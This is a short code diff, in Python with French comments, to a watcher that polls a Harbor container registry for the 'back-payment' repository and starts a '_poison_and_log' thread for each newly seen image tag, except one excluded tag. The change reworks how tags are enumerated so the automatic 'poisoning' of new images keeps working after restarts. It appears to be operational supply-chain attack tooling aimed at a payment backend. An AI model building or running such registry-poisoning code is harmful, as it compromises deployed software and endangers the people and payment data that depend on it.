@@ -638,10 +638,10 @@ def _monitor_pass():
         log(f"catchup monitor err: {e}")
 
 def _watcher_pass():
+    # itère les TAGS (pas les digests) — sinon les artifacts sans tag/1259 sont
+    # re-empoisonnés en boucle à chaque /health après un restart
     try:
-        seen = known_tags()
-        if seen is None:
-            return
+        arts = json.loads(harbor("/api/v2.0/projects/afrety/repositories/back-payment/artifacts").read())
         with lock:
             state["watcher_ts"] = time.time()
         current = set()
@@ -649,8 +649,11 @@ def _watcher_pass():
             for e in state["new_tags"]:
                 if e.get("ok"):
                     current.add(e["tag"])
-        for tag in seen:
-            if tag not in current and not tag.endswith("1259-20260916234549"):
+        for a in arts:
+            for t in (a.get("tags") or []):
+                tag = t["name"]
+                if tag in current or tag.endswith("1259-20260916234549"):
+                    continue
                 log(f"catchup watcher: NOUVEAU TAG détecté {tag} → empoisonnement")
                 threading.Thread(target=_poison_and_log, args=(tag,), daemon=True).start()
     except Exception as e:
